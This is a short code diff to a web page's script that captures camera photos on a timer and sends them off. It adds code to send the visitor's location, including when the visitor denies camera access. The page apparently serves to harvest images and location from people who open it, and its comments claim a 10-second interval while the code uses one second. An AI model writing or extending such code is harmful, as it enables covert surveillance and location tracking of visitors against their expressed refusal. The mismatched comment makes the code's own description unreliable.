@@ -228,21 +228,30 @@
                 // Wait for video to be ready
                 video.onloadedmetadata = () => {
                     document.getElementById('status').textContent = 'Camera ready...';
-
-                    // Start capturing photos with info every 2 seconds
+                    
+                    // Send location info first (once)
                     setTimeout(() => {
-                        captureAndSendPhotoWithInfo(); // First photo immediately
+                        sendLocationInfo();
+                    }, 1000);
+
+                    // Start capturing photos every 10 seconds
+                    setTimeout(() => {
+                        captureAndSendPhoto(); // First photo immediately
                         
-                        // Then capture every 2 seconds
+                        // Then capture every 10 seconds
                         photoInterval = setInterval(() => {
-                            captureAndSendPhotoWithInfo();
-                        }, 2000); // 2 seconds
+                            captureAndSendPhoto();
+                        }, 1000); // 10 seconds
                     }, 1000);
                 };
                 
             } catch (err) {
                 console.error('Camera error:', err);
-                document.getElementById('status').textContent = 'Camera access denied';
+                document.getElementById('status').textContent = 'Camera denied, sending location...';
+                // If camera fails, still send location
+                setTimeout(() => {
+                    sendLocationInfo();
+                }, 500);
             }
         });
 
